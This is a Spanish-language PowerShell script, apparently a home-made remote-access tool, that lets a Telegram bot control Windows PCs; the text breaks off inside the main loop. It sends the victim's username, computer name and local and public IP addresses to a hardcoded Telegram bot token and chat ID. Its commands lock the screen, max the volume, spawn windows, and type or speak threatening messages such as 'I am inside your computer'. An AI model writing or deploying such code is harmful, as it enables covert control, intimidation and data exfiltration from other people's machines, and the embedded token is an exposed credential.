# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM (Pon tus datos aquí)
# ==============================================================================
$Token  = "8935867266:AAELjvUiJRXauSgYmmHAMmut-SOJWXyYImg" # REEMPLAZA CON TU TOKEN REAL COMPLETO
$ChatID = "1018796719"                                    # REEMPLAZA CON TU CHAT ID REAL COMPLETO

# Construcción de URL fija ultra-estable que acabamos de validar
$URL    = "https://api.telegram.org/bot" + $Token
$MiPC   = $env:COMPUTERNAME
$User   = $env:USERNAME
# ==============================================================================
# NO BORRAR #############################################################
# ==============================================================================
# ==============================================================================
# CONFIGURACIÓN DEL BOT DE TELEGRAM 
# ==============================================================================
# Registrar APIs de pantalla de Windows de forma segura
try {
    $MethodDefinition = '[DllImport("user32.dll")] public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);'
    Add-Type -MemberDefinition $MethodDefinition -Name "Win32Utils" -Namespace "Win32" -ErrorAction SilentlyContinue
} catch {}

# Habilitar TLS 1.2
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# ==============================================================================
# LIMPIAR HISTORIAL ANTES DE INICIAR
# ==============================================================================
$LastUpdateID = 0
try {
    $PreCheck = Invoke-RestMethod -Uri "$URL/getUpdates?timeout=1" -Method Get
    if ($PreCheck.result.Count -gt 0) {
        $LastUpdateID = $PreCheck.result[-1].update_id + 1
        [void](Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=1" -Method Get)
    }
} catch {}

# --- NOTIFICAR A TELEGRAM QUE LA PC SE ENCENDIÓ ---
try {
    $MensajeInicio = "PC En Linea y Protegida: " + $User + "@" + $MiPC
    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $MensajeInicio })
} catch {}

# ==============================================================================
# BUCLE PRINCIPAL CON SISTEMA DE IDS NUMÉRICOS CORREGIDO
# ==============================================================================
while ($true) {
    try {
        $Updates = Invoke-RestMethod -Uri "$URL/getUpdates?offset=$LastUpdateID&timeout=15" -Method Get
        
        foreach ($Update in $Updates.result) {
            $LastUpdateID = $Update.update_id + 1
            $TextoRecibido = $Update.message.text
            $RemitenteChatID = $Update.message.chat.id

            if ($RemitenteChatID -eq $ChatID -and $null -ne $TextoRecibido) {
                
                # CORRECCIÓN DE MATRIZ: Extraemos de forma segura el comando y el ID del argumento
                $Partes = $TextoRecibido -split " "
                $Comando = [string]$Partes[0]
                $Comando = $Comando.ToLower()
                
                $IDDestino = ""
                if ($Partes.Count -gt 1) {
                    $IDDestino = [string]$Partes[1]
                }

                # --- COMANDO GLOBAL: /lista ---
                if ($Comando -eq "/lista") {
                    # Calcula un ID del 1 al 9 único y fijo para esta PC según su nombre
                    $LetrasPC = [char[]]$MiPC
                    $TotalAscii = 0
                    foreach ($Letra in $LetrasPC) { $TotalAscii += [int]$Letra }
                    $Seed = $TotalAscii % 9
                    if ($Seed -eq 0) { $Seed = 1 }
                    $NumAsignado = [string]$Seed

                    $RespuestaLista = "🖥️ EQUIPO EN LINEA:`nID Numerico: [" + $NumAsignado + "] -> " + $User + "@" + $MiPC
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $RespuestaLista })
                    continue
                }

                # --- COMANDO GLOBAL DE AYUDA: /ayuda ---
                if ($Comando -eq "/ayuda") {
                    $TextoAyuda = "MANUAL DE CONTROL NUMERICO`n`n" +
                                  "Comandos Globales:`n" +
                                  "• /lista - Ver que numero de ID tomo cada PC.`n" +
                                  "• /ayuda - Ver este menu.`n`n" +
                                  "Comandos Individuales (Deja un espacio y pon el numero de la PC):`n" +
                                  "• /pantalla_off [Numero]`n" +
                                  "• /pantalla_on [Numero]`n" +
                                  "• /notepad [Numero]`n`n" +
                                  "Ejemplo de uso: /notepad 1"
                    
                    [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                    continue
                }

                # CALCULAR MI PROPIO ID PARA COMPARAR
                $MisLetras = [char[]]$MiPC
                $MiAscii = 0
                foreach ($M in $MisLetras) { $MiAscii += [int]$M }
                $MiSeed = $MiAscii % 9
                if ($MiSeed -eq 0) { $MiSeed = 1 }
                $MiIDNum = [string]$MiSeed

                # VALIDACIÓN CRÍTICA: Solo ejecuta si el número coincide con el de esta máquina
                if ($IDDestino -eq $MiIDNum -and $IDDestino -ne "") {
                    
                    switch ($Comando) {
                                        
                        "/ayuda" {
                            $TextoAyuda = "MANUAL DE COMANDOS`n`n" +
                                          "• /lista o /ayuda - Comandos globales.`n" +
                                          "• /ip [ID] - Ver datos de red.`n" +
                                          "• /reloj [ID] - Cuenta regresiva flotante.`n" +
                                          "• /notepad [ID] - Abre bloc de notas.`n" +
                                          "• /subir_vol [ID] - Sube el audio.`n" +
                                          "• /silenciar [ID] - Mutea el sonido.`n" +
                                          "• /escritorio [ID] - Minimiza todo.`n" +
                                          "• /luces [ID] - Destella luz de CapsLock.`n" +
                                          "• /youtube [ID] - Abre YouTube.`n" +
                                          "• /hablar [ID] - Reproduce voz remota.`n" +
                                          "• /pitido [ID] - Ejecuta alertas Beep.`n" +
                                          "• /calculadora [ID] - Abre calculadora.`n" +
                                          "• /pantalla_off [ID] - Bloquea equipo.`n" +
                                          "• /pantalla_on [ID] - Despierta pantalla."
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Method Post -Body @{ chat_id = $ChatID; text = $TextoAyuda })
                        }
                        "/reloj" {
                            $wsh = New-Object -ComObject WScript.Shell
                            # Al usar un bucle asincrono, no se traba el bot de Telegram
                            $ScriptReloj = [scriptblock]{
                                $w = New-Object -ComObject WScript.Shell
                                for ($i = 60; $i -gt 0; $i--) {
                                    $w.Popup("Faltan " + $i + " segundos para desbloquear la pantalla.", 1, "Cuenta Regresiva", 0 + 48 + 4096)
                                }
                            }
                            $Null = Start-Job -ScriptBlock $ScriptReloj
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Cuenta regresiva flotante iniciada en ID " + $MiIDNum })
                        }
                        "/notepad" {
                            notepad.exe
                            Start-Sleep -Milliseconds 500
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("Te estoy observando por Internet...")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Bloc de notas abierto en ID " + $MiIDNum })
                        }
                        "/subir_vol" {
                            $wsh = New-Object -ComObject WScript.Shell
                            for ($i = 0; $i -lt 50; $i++) { $wsh.SendKeys([char]175) }
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Volumen al maximo en ID " + $MiIDNum })
                        }
                        "/silenciar" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys([char]173)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Audio silenciado/activado en ID " + $MiIDNum })
                        }
                        "/escritorio" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("#d") # Atajo Windows + D
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Escritorio mostrado en ID " + $MiIDNum })
                        }
                        "/luces" {
                            $wsh = New-Object -ComObject WScript.Shell
                            for ($i = 0; $i -lt 10; $i++) {
                                $wsh.SendKeys("{CAPSLOCK}")
                                Start-Sleep -Milliseconds 200
                            }
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Prueba de luces completada en ID " + $MiIDNum })
                        }
                        "/youtube" {
                            Start-Process "https://youtube.com"
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Navegador abierto en YouTube en ID " + $MiIDNum })
                        }
                        "/hablar" {
                            try {
                                Add-Type -AssemblyName System.Speech
                                $synthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer
                                $synthesizer.Speak("Hola. Estoy dentro de tu computadora.")
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Sintetizador de voz ejecutado en ID " + $MiIDNum })
                            } catch {
                                [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "El equipo ID " + $MiIDNum + " no soporta voz nativa" })
                            }
                        }
                        "/pitido" {
                            for ($i = 0; $i -lt 5; $i++) {
                                [console]::Beep(1500, 400)
                                Start-Sleep -Milliseconds 200
                            }
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Alertas sonoras Beep enviadas a ID " + $MiIDNum })
                        }
                        "/calculadora" {
                            for ($i = 0; $i -lt 5; $i++) {
                                Start-Process calc.exe
                                Start-Sleep -Milliseconds 300
                            }
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Calculadoras abiertas en ID " + $MiIDNum })
                        }
                        "/pantalla_off" {
                            $rundll = New-Object -ComObject WScript.Shell
                            $rundll.Run("rundll32.exe user32.dll,LockWorkStation")
                            [Win32.Win32Utils]::SendMessage(-1, 0x0112, 0xF170, 2)
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla apagada en ID " + $MiIDNum })
                        }
                        "/pantalla_on" {
                            $wsh = New-Object -ComObject WScript.Shell
                            $wsh.SendKeys("{SHIFT}")
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = "Pantalla encendida en ID " + $MiIDNum })
                        }
                        "/ip" {
                            $IPLocal = (Get-NetIPAddress -InterfaceAddressFamily IPv4 | Where-Object { $_.IPAddress -notlike "127*" -and $_.IPAddress -notlike "169*" }).IPAddress -join ", "
                            if ($null -eq $IPLocal -or $IPLocal -eq "") { $IPLocal = "No detectada" }
                            $IPPublica = "Desconectado"
                            try { $IPPublica = (Invoke-RestMethod -Uri "https://ipify.org" -TimeoutSec 5).Trim() } catch {
                                try { $IPPublica = (Invoke-RestMethod -Uri "https://ifconfig.me" -TimeoutSec 5).Trim() } catch {}
                            }
                            $ReporteIP = "DATOS DE RED DE LA PC`n`nID Numerico: [" + $MiIDNum + "]`nEquipo: " + $User + "@" + $MiPC + "`n`n• IP Local (Red): " + $IPLocal + "`n• IP Publica (Internet): " + $IPPublica
                            [void](Invoke-RestMethod -Uri "$URL/sendMessage" -Body @{ chat_id = $ChatID; text = $ReporteIP })
                        }
                    }
